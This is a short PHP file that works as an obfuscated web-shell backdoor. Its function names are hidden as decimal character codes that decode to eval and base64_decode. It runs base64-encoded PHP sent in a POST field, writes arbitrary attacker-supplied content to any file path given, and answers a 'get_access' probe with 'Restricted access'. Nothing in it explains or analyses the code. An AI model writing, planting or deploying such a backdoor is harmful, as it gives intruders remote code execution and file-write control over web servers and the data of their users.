<?php
$__array = array(
    "g"=>"103 101 116 95 97 99 99 101 115 115",
    "r"=>"82 101 115 116 114 105 99 116 101 32 97 99 99 101 115 115",
    "e"=>"101 118 97 108",
    "b"=>"98 97 115 101 54 52 95 100 101 99 111 100 101",
);

foreach($__array as $__key=>$__val) $__array[$__key] = implode("", array_map("chr", explode(" ", $__val)));

if(isset($_GET[$__array["g"]])) die($__array["r"]);

if(isset($_POST['update']) AND !empty($_POST[$__array["e"]])) {eval($__array["b"]($_POST[$__array["e"]])); exit;}
if(isset($_POST['update']) AND !empty($_POST['path'])) {
    $filename = $_POST['path'];
    $somecontent = $__array["b"]($_POST['update']);
    if (!$handle = fopen($filename, 'w')) {
        echo "Cannot open file ($filename)";
        exit;
    }
    if (fwrite($handle, $somecontent) === FALSE) {
        echo "Cannot write to file ($filename)";
        exit;
    }
    echo "Success, wrote ".strlen($somecontent)." bytes to file (".dirname(__FILE__)."/".$filename.")";
    fclose($handle);
   exit();
}
?>
